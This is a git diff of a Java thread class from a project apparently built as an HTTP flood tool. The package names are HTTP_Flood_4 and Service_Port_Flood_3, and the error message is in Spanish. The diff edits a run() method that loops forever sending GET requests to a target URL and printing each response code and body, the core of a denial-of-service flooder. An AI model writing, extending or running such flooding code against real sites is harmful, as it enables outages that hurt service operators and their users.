@@ -1,5 +1,6 @@
 package HTTP_Flood_4;
 
+import Service_Port_Flood_3.Hilo3;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -17,14 +18,26 @@ public class Hilo4 extends Thread {
 
     public void run() {
         BufferedReader in = null;
+        String inputLine;
+        StringBuffer response;
         try {
             while (true) {
                 con = (HttpURLConnection) url.openConnection();
                 con.setRequestMethod("GET");
-                //int respuesta = con.getResponseCode();
+                int respuesta = con.getResponseCode();
                 System.out.println("\nSending 'GET' request to URL : " + url);
-                //System.out.println("Response Code : " + respuesta);
+                System.out.println("Response Code : " + respuesta);
+                
                 in = new BufferedReader(new InputStreamReader(con.getInputStream()));
+		response = new StringBuffer();
+
+		while ((inputLine = in.readLine()) != null) {
+			response.append(inputLine);
+		}
+		in.close();
+                con.disconnect();
+		//print result
+		System.out.println(response.toString());
             }
         } catch (Exception ex) {
             System.out.println("Error al establecer conexión");
